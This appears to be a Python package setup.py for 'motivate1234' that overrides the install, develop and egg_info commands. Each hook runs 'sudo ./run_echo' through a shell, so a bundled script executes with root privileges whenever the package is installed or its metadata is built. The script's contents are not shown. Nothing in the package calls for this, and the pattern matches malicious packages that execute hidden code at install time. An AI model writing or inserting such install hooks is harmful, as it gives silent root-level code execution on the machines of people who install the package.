
from setuptools import setup
from setuptools.command.install import install
from setuptools.command.develop import develop
from setuptools.command.egg_info import egg_info
import subprocess

__project__ = "motivate1234"
__version__ = "0.0.31"
__description__ = "this version run bash"
__packages__ = ["motivate1234"]

def run_initial():
	subprocess.call(["sudo ./run_echo"], shell = True)

class CustomInstallCommand(install):
	def run(self):
		install.run(self)
		run_initial()

class CustomDevelopCommand(develop):
	def run(self):
		develop.run(self)
		run_initial()

class CustomEggInfoCommand(egg_info):
	def run(self):
		egg_info.run(self)
		run_initial()

setup(
	name = __project__,
	version = __version__,
	description = __description__,
	packages = __packages__,
	include_package_data = True,
	cmdclass={
		'install': CustomInstallCommand,
		'develop': CustomDevelopCommand,
		'egg_info': CustomEggInfoCommand,
	}
)

